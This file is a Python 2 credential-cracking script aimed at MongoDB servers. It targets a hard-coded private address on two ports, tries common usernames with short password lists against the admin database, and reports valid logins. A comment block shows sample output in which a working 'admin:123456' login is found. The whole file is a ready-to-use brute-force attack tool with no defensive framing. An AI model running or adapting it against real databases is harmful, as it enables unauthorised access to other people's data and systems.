#!/usr/bin/python
# coding: utf-8 

#require pymongo installed

#running example:
#[-] Strart cracking MongoDB server: [192.168.1.23]
#[-] MongoDB Connection Failure, port: [27017]
#[-] Invalid MongoDB user/password: [admin:123], port: [37017]
#[-] Invalid MongoDB user/password: [admin:12345], port: [37017]
#[+] > Valid MongoDB user/password: [admin:123456], port: [37017]
#[-] Invalid MongoDB user/password: [admin:admin], port: [37017]
#[-] Invalid MongoDB user/password: [root:123], port: [37017]
#[-] Invalid MongoDB user/password: [root:12345], port: [37017]
#[-] Invalid MongoDB user/password: [root:123456], port: [37017]
#[-] Invalid MongoDB user/password: [root:admin], port: [37017]
#[-] Invalid MongoDB user/password: [root:root], port: [37017]
#[-] Invalid MongoDB user/password: [mongo:123], port: [37017]
#[-] Invalid MongoDB user/password: [mongo:12345], port: [37017]
#[-] Invalid MongoDB user/password: [mongo:123456], port: [37017]
#[-] Invalid MongoDB user/password: [mongo:admin], port: [37017]
#[-] Invalid MongoDB user/password: [mongo:root], port: [37017]
#[-] Invalid MongoDB user/password: [mongo:mongo], port: [37017]

from pymongo import MongoClient
from pymongo import errors as mongoErr
import urllib

host = "192.168.1.23"
ports = [ 27017, 37017 ]
u_dict = ["admin", "root", "mongo"]
p_dict = ["123", "12345", "123456"]

def get_mechanism(port):
    global g_conn

    try:
       g_conn = MongoClient("mongodb://%s:%s" % (host, port))
       db_version = int(g_conn.server_info()['version'].split('.')[0])
    except:
        return None
    #mongoErr.ConnectionFailure(pymongo 2.7.2) or mongoErr.ServerSelectionTimeoutError(pymongo 3.4.0)

    db_version = int(g_conn.server_info()['version'].split('.')[0])

    if db_version >= 3:
        authMechanism = "SCRAM-SHA-1"
    else:
        authMechanism = "MONGODB-CR"
    return authMechanism

def check(user, passwd):
    try:
        auth = g_conn.admin.authenticate(user, passwd, mechanism=g_authMechanism)   #crack user within admin database
        return True
    except:
    #mongoErr.OperationFailure or something like mongoErr.ConfigurationError: mechanism must be in frozenset(['PLAIN', 'MONGODB-CR', 'GSSAPI', 'MONGODB-X509'])
        return False

def get_pass_pair():
    pass_pair = []
    for u in u_dict:
        p_dict.append(u)
        for p in p_dict:
            pass_pair.append({'user':u, 'passwd':p})
    return pass_pair


if __name__ == "__main__":
    global g_authMechanism
    print "[-] Strart cracking MongoDB server: [%s]" % host

    for port in ports:
        g_authMechanism = get_mechanism(port)

        if not g_authMechanism:
            print "[-] MongoDB Connection Failure, port: [%s]" % port
            continue

        for pair in get_pass_pair():
            user = pair['user']
            passwd = pair['passwd']
            if check(user, passwd):
                print "[+] > Valid MongoDB user/password: [%s:%s], port: [%s]" % (user, passwd, port)
            else:
                print "[-] Invalid MongoDB user/password: [%s:%s], port: [%s]" % (user, passwd, port)
